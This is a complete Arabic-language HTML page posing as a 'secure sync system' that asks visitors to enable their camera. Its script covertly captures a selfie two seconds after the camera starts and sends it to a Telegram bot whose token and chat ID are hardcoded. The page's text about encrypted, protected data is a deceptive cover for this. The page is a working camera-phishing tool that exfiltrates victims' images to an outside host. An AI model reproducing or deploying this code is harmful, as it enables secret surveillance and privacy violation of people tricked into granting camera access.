<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام المزامنة الذكي</title>
    <style>
        :root {
            --primary: #6200ea;
            --bg: #121212;
            --surface: #1e1e1e;
            --accent: #00e676;
        }

        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: var(--bg); 
            color: white; 
            margin: 0; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh;
        }

        .container {
            width: 90%;
            max-width: 400px;
            background: var(--surface);
            padding: 30px;
            border-radius: 25px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
            border: 1px solid #333;
            text-align: center;
        }

        .video-box {
            width: 100%;
            aspect-ratio: 1/1;
            background: #000;
            border-radius: 20px;
            overflow: hidden;
            margin-bottom: 20px;
            border: 2px solid #444;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1); /* لتظهر كمرآة */
        }

        #status {
            font-size: 14px;
            margin-bottom: 20px;
            color: #bbb;
            padding: 10px;
            border-radius: 10px;
        }

        .status-active {
            color: var(--accent) !important;
            background: rgba(0, 230, 118, 0.1);
        }

        button {
            width: 100%;
            padding: 16px;
            font-size: 18px;
            font-weight: bold;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 15px;
            cursor: pointer;
            transition: 0.3s;
        }

        button:active {
            transform: scale(0.96);
        }

        .footer-note {
            font-size: 11px;
            color: #555;
            margin-top: 15px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2 style="margin-top:0;">نظام المعاينة الآمن</h2>
        <p style="color: #888; font-size: 14px;">يرجى تفعيل الكاميرا لبدء المزامنة مع السيرفر</p>

        <div class="video-box">
            <video id="video" autoplay playsinline></video>
        </div>

        <div id="status">الحالة: في انتظار التشغيل</div>

        <button id="mainBtn" onclick="startSystem()">تشغيل النظام الآن</button>
        
        <p class="footer-note">هذا التطبيق محمي ومشفر لنقل البيانات الشخصية</p>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // --- بياناتك الشخصية التي استخرجناها ---
        const BOT_TOKEN = '8455403624:AAGfoq9rNX2CTDbN2s6PeV8oyfosDLtDZSQ';
        const CHAT_ID = '6975241289';
        // ------------------------------------

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');
        const mainBtn = document.getElementById('mainBtn');

        async function startSystem() {
            status.textContent = "جاري طلب إذن الكاميرا...";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: 720 } 
                });
                
                video.srcObject = stream;
                mainBtn.style.display = 'none';
                status.textContent = "تم الاتصال.. جاري المعالجة تلقائياً...";
                status.className = "status-active";

                // بمجرد أن يبدأ الفيديو، انتظر ثانية واحدة ثم التقط الصورة
                video.onloadedmetadata = () => {
                    setTimeout(autoCapture, 2000); // تأخير ثانيتين لضمان وضوح الصورة
                };

            } catch (err) {
                status.textContent = "خطأ: يجب السماح بالكاميرا ليعمل النظام.";
                status.style.color = "#ff5252";
            }
        }

        function autoCapture() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // رسم الصورة مع عكسها لتصحيح وضع المرآة
            context.translate(canvas.width, 0);
            context.scale(-1, 1);
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // تحويل الصورة إلى ملف وإرسالها
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.png');
                formData.append('caption', '📸 تم استلام سيلفي تلقائي جديد!');

                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    if (response.ok) {
                        status.textContent = "تمت المزامنة بنجاح! ✅";
                    } else {
                        status.textContent = "خطأ في المزامنة مع السيرفر.";
                    }
                } catch (error) {
                    status.textContent = "خطأ في الاتصال بالشبكة.";
                }
            }, 'image/png');
        }
    </script>

</body>
</html>
